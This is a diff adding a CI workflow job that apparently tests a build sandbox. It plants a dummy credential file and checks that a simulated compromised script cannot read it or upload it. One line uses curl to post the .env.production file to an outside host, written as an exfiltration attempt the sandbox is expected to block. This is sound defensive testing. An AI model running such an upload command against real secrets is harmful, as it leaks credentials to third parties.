@@ -64,3 +64,46 @@ jobs:
                 url: https://example.com
                 allow:
                   - GET /**
+
+  profile-exfiltration-demo:
+    name: Profile exfiltration demo
+    if: github.event_name == 'workflow_dispatch'
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+
+      - name: Create a harmless production credential canary
+        run: printf 'DEPLOY_TOKEN=demo-canary-only\n' > .env.production
+
+      - name: Simulate a compromised build script
+        uses: ./
+        with:
+          runseal-version: source
+          profile: examples/profile-exfiltration.json
+          run: |
+            set -euo pipefail
+            cat Cargo.toml > /dev/null
+            cat src/main.rs > /dev/null
+            echo "Allowed: build inputs are readable"
+
+            if cat README.md > /dev/null; then
+              echo "::error::An unlisted file was readable inside the sandbox"
+              exit 1
+            fi
+            echo "Blocked by default: an unlisted file cannot be read"
+
+            if cat .env.production > /dev/null; then
+              echo "::error::The canary was readable inside the sandbox"
+              exit 1
+            fi
+            echo "Blocked: the canary cannot be read"
+
+            if curl --silent --show-error --max-time 5 \
+              --data-binary @.env.production https://example.com/upload; then
+              echo "::error::The simulated upload succeeded"
+              exit 1
+            fi
+            echo "Blocked: the simulated upload did not succeed"
